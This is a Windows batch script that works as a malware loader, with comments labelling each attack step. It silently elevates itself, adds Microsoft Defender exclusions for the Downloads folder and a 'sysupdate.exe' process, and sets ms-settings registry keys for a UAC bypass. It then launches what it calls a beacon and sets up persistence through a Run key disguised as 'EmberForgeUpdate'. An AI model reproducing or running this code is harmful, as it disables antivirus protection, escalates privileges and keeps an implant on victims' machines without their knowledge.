@echo off
:: Check if running as Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: Now running as Administrator
:: Step 1: Add Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\Downloads'"
powershell -Command "Add-MpPreference -ExclusionProcess 'sysupdate.exe'"

:: Step 2: UAC Bypass
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Users\%USERNAME%\Downloads\sysupdate.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f

:: Step 3: Run the beacon
start C:\Users\%USERNAME%\Downloads\sysupdate.exe

:: Step 4: Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EmberForgeUpdate" /t REG_SZ /d "C:\Users\%USERNAME%\Downloads\sysupdate.exe" /f